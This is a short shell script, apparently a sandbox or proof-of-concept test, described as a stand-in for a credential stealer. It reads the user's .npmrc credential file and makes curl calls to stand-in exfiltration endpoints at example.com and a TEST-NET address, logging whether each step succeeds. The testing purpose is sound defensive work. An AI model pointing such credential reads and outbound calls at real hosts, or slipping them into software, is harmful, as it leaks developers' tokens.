#!/bin/sh
# Stand-in for a credential stealer. It reads a credential file and sends data
# out two ways. The targets are harmless: example.com is reserved for
# documentation, and 192.0.2.10 is TEST-NET-1, which no network routes.
out="${POC_RESULTS:-/tmp}/t4"
mkdir -p "$out"

cat "$HOME/.npmrc" >/dev/null 2>&1
echo $? >"$out/read-npmrc.rc"

curl -sS -m 10 -o /dev/null -w '%{http_code}' https://example.com/exfil >"$out/https-exfil.http" 2>"$out/https-exfil.err"
echo $? >"$out/https-exfil.rc"

curl -sS -m 5 -o /dev/null http://192.0.2.10:8080/exfil 2>"$out/port-8080.err"
echo $? >"$out/port-8080.rc"

exit 0
